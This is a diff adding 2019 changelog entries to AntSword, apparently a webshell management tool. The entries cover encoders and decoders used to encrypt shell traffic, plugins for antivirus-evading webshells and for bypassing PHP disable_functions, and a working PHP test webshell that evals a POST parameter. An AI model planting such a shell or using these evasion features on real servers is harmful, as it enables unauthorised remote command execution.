@@ -2,6 +2,232 @@
 > 有空会补补BUG、添添新功能。    
 > 同时也欢迎大家的参与！感谢各位朋友的支持！ .TAT.
 
+## 2019/06/11 `v(2.1.3)`
+
+### 核心模块
+
+* 移除解码器 `decode_str` 方法, 统一调用 `decode_buff` 方法
+
+> `decode_str` 其实相当于是 `decode_buff` 执行后调用了 `toString`
+
+* 解码器解码后, 增加猜解字符编码流程
+* 修复 PHP mysqli 指定其它端口时失败的问题
+* CUSTOM 类型新增 `hex`, `base64`, `hex_base64` 三种类型解码器 (需要对应 Shell 实现该功能, 参考: `jsp_custom_script_for_mysql.jsp`)
+
+ > hex_base64 是指 shell 返回数据时, 先将明文数据使用 base64 编码, 再将结果 hex 编码
+
+* ASPX 新增 `url_unicode` 编码器 (thx @yzddmr6 https://github.com/AntSwordProject/AwesomeEncoder/issues/2)
+
+> 将 pwd payload 全部转换成 `%uxxxx` 这种形式, eg: `Re` => `%u0052%u0065`
+
+### 文件管理
+
+* 「文件下载」支持多文件下载, **不支持选择「文件夹」** #140
+
+### 其它
+
+* 修复 `jsp_custom_script_for_mysql.jsp` 使用 `base64` 编码器连接数据库时 `characterEncoding` 二次解码导致的无法识别的问题 #171
+* 修复 `ASP`、`Custom` 数据库管理导出问题 #172
+* `jsp_custom_script_for_mysql.jsp`, `jsp_custom_script_for_oracle.jsp`, `jspx_custom_script_for_mysql.jspx` 新增解码器支持
+* 现在可以使用 HomeBrew 来安装、更新 `AntSword-Loader` 和 `AntSword` 了。参见 [homebrew-antsword](https://github.com/AntSwordProject/homebrew-antsword/)
+
+  具体步骤如下:
+
+  1. 添加 antsword 源
+  ```
+  $ brew tap antswordproject/antsword
+  ```
+  2. 安装 antsword-loader
+
+  ```
+  $ brew cask install antsword-loader
+  ```
+
+  3. 安装 antsword
+
+  ```
+  $ brew install antsword
+  ```
+
+  安装完毕后，运行 AntSword.app, 选择源码目录为 `/usr/local/opt/antsword`
+
+  **如果使用 HomeBrew 来管理antsword-loader 和 antsword 的版本，请一直使用该方式进行管理**
+
+### 插件相关
+
+* 新增 [「免杀Shell生成」插件](https://github.com/yzddmr6/as_webshell_venom) (Author: @yzddmr6)
+
+> 利用随机异或免杀D盾蚁剑版
+
+## 2019/05/13 `v(2.1.2)`
+
+### 核心模块
+
+* 修复 multipart 发包方式 download 发包为空的问题 (`asunescape` 功能引起), 更新后需要关闭程序重启后生效
+* 编码器 `ext` 参数新增元素 `opts`, 值为当前 shell 的配置
+
+> 有了这个,你就可以根据 shell 的配置信息来动态的进行加密了, 比如用 Cookie 里面的 SessionID 来作为秘钥
+>
+> 与之相关的一个 Demo, PHP AES-256-CFB (zeroPadding) 编码器
+> https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/encoder/aes_256_cfb_zero_padding.js
+>
+> 另一个 Demo, PHP AES-128-ECB (zeroPadding) 编码器
+> https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/encoder/aes_128_ecb_zero_padding.js
+
+* 解码器新增 `ext` 参数, 用于获取 shell 配置和rsa私钥
+
+> 有了这个,解码器可以进行一些更为灵活的用法了. 比如用 Cookie 中的 SessionID 来作为秘钥, 对返回的内容进行解密
+>
+> 与之相关的一个 Demo, PHP AES-256-CFB (Zero Padding) 解码器
+> https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/decoder/aes_256_cfb_zero_padding.js
+>
+> 另一个 Demo, PHP AES-128-ECB (pkcs7Padding) 解码器
+> https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/decoder/aes_128_ecb_pkcs7_padding.js
+
+PS: 
+
+* 可以用 `AES-256-CFB` 编码器, 对请求包进行加密, 返回包加密使用 `AES-128-ECB` 解码器
+
+* 也可以用 `AES-128-ECB` 编码器, 对请求包进行加密, 返回包加密使用 `AES-256-CFB` 解码器
+
+当然, 你可以根据自己的喜好, 用自己喜欢的 AES 加密方式, 这些怎么组合, 都看你。你要不喜欢用 AES, 你想用什么就用什么。
+
+* 支持加载用户自定义解码器, 同编码器一样, 现在可以加载用户自己自定义的解码器了, 以PHP为例, 加载位置为 `antData/encoders/php/decoder/`
+
+### 数据管理
+
+* 「添加数据」时自动载入「默认设置」中「数据管理」全局配置内容
+
+![adefault_shellmanager_2.png](https://i.loli.net/2019/04/30/5cc83fb205051.png)
+
+### 其它
+
+* 「默认设置」新增「数据管理」设置, 可配置「是否忽略HTTPS证书」、「默认请求超时时长」、「默认 HTTP Header」和「默认 HTTP Body」
+
+> 该配置项仅在「添加数据」时生效，不影响已有配置的 Shell。在添加数据界面修改相应的值, 仅对当前 Shell 配置产生影响，不会影响到默认配置
+
+![adefault_shellmanager_1.png](https://i.loli.net/2019/04/30/5cc83fafdf0d8.png)
+
+* 新增第三方库 marked 0.6.2 用于 markdown 渲染
+* 更新提示窗口新增 ReleaseNote 显示(缩放显示,图片看不清可直接前往 github 查看详细更新日志), 新增 「更新日志」按钮(点击后直接打开 github release 页)
+* 「编码管理」新增「获取更多」按钮, 打开浏览器访问 AwesomeEncoder(自定义编码器分享), 如果你有比较好的 Encoder, 欢迎向这个仓库提PR
+* 「编码管理」新增解码器管理, 可创建自定义解码器
+
+![aencoder.png](https://i.loli.net/2019/05/13/5cd95654c75ac23085.png)
+
+* 新增第三方库 `crypto-js` 3.1.9-1 , 可以更方便的进行各种加解密处理了
+
+> nodejs 自带 `crypto` 库, 也可使用 `crypto-js` 这个库来进行加密处理, 这个第三方库使用起来相对更简单一些, 但同时限制也会多一些, 自行取舍
+
+## 2019/04/27 `v(2.1.1)`
+
+### 核心模块
+
+* 新增「解码器」(目前仅支持 PHP)
+
+> 将返回数据包进行编码/加密
+
+* 新增 PHP `base64`、`rot13` 解码器
+
+* 修复使用 `__destruct` 类型 shell 时 解码器不生效的 Bug (thx @scanf)
+
+> 取消 `register_shutdown_function` 改为显式调用 `asoutput`
+
+测试 Shell 如下:
+
+```
+<?php
+class Test{
+  function __destruct(){
+    @eval($_POST['ant']);
+  }
+}
+$test = new Test;
+?>
+```
+
+### Shell 管理
+
+* 修复搜索数据时正则表达式输入错误导致crash 问题 #157
+
+### 数据管理
+
+* 添加SQL语句书签功能, 将常用的 SQL 语句保存成书签
+
+![db_bookmark_2.jpg](https://i.loli.net/2019/04/27/5cc3e8ec1c23c.jpg)
+
+* 修复数据库查询结果字段名有逗号时异常
+
+### 其它
+
+* 「默认设置」数据管理项中, 增加「全局书签」设置, 设置一些自己常用的 SQL 语句
+
+![db_bookmark_1.jpg](https://i.loli.net/2019/04/27/5cc3e8ea2abff.jpg)
+
+## 2019/04/24 `v(2.1.0)`
+
+### 重要提醒
+
+从该版本开始, 将逐渐**不兼容老版本加载器**, 建议马上升级 AntSword Loader 到 4.0.3 版本: [下载地址](https://github.com/AntSwordProject/AntSword-Loader/tree/4.0.3)
+
+### 依赖相关更新
+
+* 升级 `Electron` 到 `4.0.3` (Chromium `69.0.3497.106` and Node `10.11.0`)
+
+> 影响较大的是编码器中关于 Buffer 相关的操作, 原来的 `new Buffer()` 方式已被弃用, 请更改为 `Buffer.from()`
+
+* 升级 `Semanticui` 到 `2.2.7`
+* 升级 `ACE Editor` 到 `1.4.3`
+* 调整 `ant-views://`、`ant-src://`、`ant-static://` 协议, 注册为标准scheme
+
+> 默认情况下 web storage apis (localStorage, sessionStorage, webSQL, indexedDB, cookies) 被禁止访问非标准schemes
+
+* 添加 `node-rsa` 依赖包
+
+### 安全更新
+
+* 主窗口中增加 CSP 策略
+
+### 功能更新
+
+* 新增「复制 Shell URL」功能
+* 编码器新增扩展参数
+* 编码器添加 RSA 模式，目前仅支持 PHP (@virink)
+* 新增 asp `insert_percent` 编码器 #152
+* 编码器中支持 `asunescape()` 标记
+
+> asunescape 括号中的内容在HTTP请求时,不会进行urlEncode
+>
+> eg:
+>
+> `data["key1"] = "++asunescape(@@@)++";  => "key1=%3B%3B@@@%3B%3B"`
+
+* 新增 Loader 更新检查功能
+* 插件市场新增「更新插件」功能
+
+### 插件相关
+
+* 新增 [「绕过disable_functions」插件](https://github.com/Medicean/as_bypass_php_disable_functions) (Author: @Medicean & @howmp)
+
+> 突破 disable_functions 执行系统命令，绕过 Open_basedir 等安全机制
+
+* 新增 [「GodOfHacker」插件](https://github.com/virink/as_plugin_godofhacker) (Author: @virink)
+
+> 黑客神器，谁用谁知道！
+
+## `v(2.0.7.3)
+
+* 主窗口增加 CSP 策略
+* Fix self-xss in database config #151 (thx @miaochiahao)
+* Fix #153 (thx @ViCrack)
+* 复制 Shell URL #144
+
+## `v(2.0.7.2)`
+
+* Fix #150 文件路径输入框未过滤问题
+* 修复目录树双击时引起console下报错问题
+* 修正 aslistcmd 二次转义问题
+
 ## `v(2.0.7.1)`
 
 ### 安全更新 (重要)
